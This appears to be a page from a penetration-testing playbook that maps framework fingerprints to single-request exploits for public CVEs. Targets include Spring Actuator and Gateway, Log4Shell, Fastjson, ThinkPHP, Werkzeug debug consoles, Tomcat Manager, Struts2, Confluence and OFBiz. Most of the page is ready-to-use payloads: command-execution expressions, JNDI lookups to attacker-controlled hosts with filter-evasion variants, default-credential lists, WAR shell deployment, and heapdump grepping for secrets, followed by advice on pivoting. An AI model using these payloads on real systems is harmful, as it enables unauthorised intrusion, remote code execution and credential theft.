## Framework 1-Day Quick-Wins — fingerprint → known-CVE RCE in one request
When recon fingerprints an enterprise framework, a precise version maps to a public CVE whose PoC is a
single request. Highest signal-per-minute. RULE: a version banner alone is N/A — land the actual PoC
(extracted secret, reflected command output, deployed shell) before claiming impact.

Spring Boot Actuator (`X-Application-Context` header, Whitelabel error, `/actuator` JSON index):
enumerate `env health info heapdump mappings configprops gateway beans` under `/actuator` and `/`.
- `/actuator/heapdump` (200) → download (50-500MB) → `strings heap.hprof | grep -iE 'password|secret|aws_|api[_-]?key|jdbc:|bearer '`. Live DB/AWS creds, tokens. Each cred = a finding.
- `/env` POST-write (Boot 1.x/2.x): set `spring.cloud.bootstrap.location` → attacker YAML, then POST `/actuator/refresh` → SpEL/deser RCE. N/A: `/health` alone or all values masked `******`.

Spring SpEL: `#{7*7}`→49 is a TRUE SpEL sink (RCE-capable); `${7*7}`→49 is property-placeholder
reflection ONLY (`T()` silently fails — a trap, don't burn the window). RCE via `#{...}`:
`#{T(java.lang.Runtime).getRuntime().exec('id')}`; no-output DNS confirm
`#{T(java.net.InetAddress).getByName('OUT.attacker.oast.site')}`.

Spring Cloud Gateway CVE-2022-22947 (3.0.0-3.0.6/3.1.0, `/actuator/gateway/routes` = 200):
POST a route whose `AddResponseHeader` filter value is a SpEL exec expr → POST `/actuator/gateway/refresh`
→ GET the route, read output from the `Result` header → DELETE the route. Unauth RCE.

Log4Shell CVE-2021-44228 (any Java app logging user input — UA/Referer/username/search):
`${jndi:ldap://${hostName}.OASTID.oast.site/a}` in User-Agent/X-Api-Version/Referer; watch OAST.
Filtered? `${${lower:j}ndi:...}`, `${${::-j}ndi:...}`, or DNS-only `${jndi:dns://x.oast.site/a}`.

Fastjson/Jackson AutoType: JSON API echoing body, `@type` accepted. DNS probe
`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://OASTID.oast.site/a","autoCommit":true}`.
RCE: point `dataSourceName` at a rogue JNDI server (JNDIExploit.jar); post-8u191 needs a local-classpath
gadget. `autoType is not support` = blocked, move on.

ThinkPHP 5.x (`?s=` routing, `think\` in errors, PHPSESSID; 5.0.5-5.0.22 / <5.1.31):
`/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
(5.0.x); `/?s=index/\think\Request/input&filter[]=system&data=id` (5.1.x). Reflected output = confirmed.

Flask/Werkzeug debug (`Server: Werkzeug`, interactive traceback, `/console`) = `debug=True` in prod.
With an LFI, read the 6 PIN ingredients (`/etc/passwd` user, modname `flask.app`, appname `Flask`,
app path from traceback, MAC `/sys/class/net/eth0/address`, `/etc/machine-id`), reproduce the Werkzeug
PIN offline, then `/console` → `__import__('os').popen('id').read()`.

Tomcat Manager (`Server: Apache-Coyote`, `/manager/html` Basic-Auth): weak-cred shortlist
`tomcat:tomcat admin:admin tomcat:s3cret manager:manager` vs `/manager/text/list`; on 200 deploy a JSP
WAR `curl -u U:P -T shell.war ".../manager/text/deploy?path=/poc&update=true"`. Windows `readonly=false`
CVE-2017-12615: `PUT /poc.jsp/` (trailing slash) with JSP body.

Struts2 S2-045 CVE-2017-5638 (`.action`/`.do`): OGNL in the `Content-Type` header, command output
reflected in a response header (heavily virtual-patched — a 403 is often the WAF, not a fix).

Confluence CVE-2022-26134 (`X-Confluence-Request-Time`, `/wiki`): pre-auth OGNL in the URL namespace,
URL-encoded `${(#a=@...Runtime@...exec("id")...setHeader("X-Cmd-Response",#a))}` → output in
`X-Cmd-Response`. Note: often vendor-hosted — check asset ownership/scope first.

Apache OFBiz (`/control/main`; <18.12.16): auth-bypass view via override params
`ViewBlogArticle?USERNAME=&PASSWORD=&requirePasswordChange=Y` → Groovy/XML-RPC chain to RCE.

Chain: heapdump/secret → AWS keys → [[ssrf]] cloud pivot; shell → internal net → adjacent IDOR/SSRF.
Pull the secret or land the shell first, map what it unlocks, then report. See [[secrets_recon]], [[chains]].
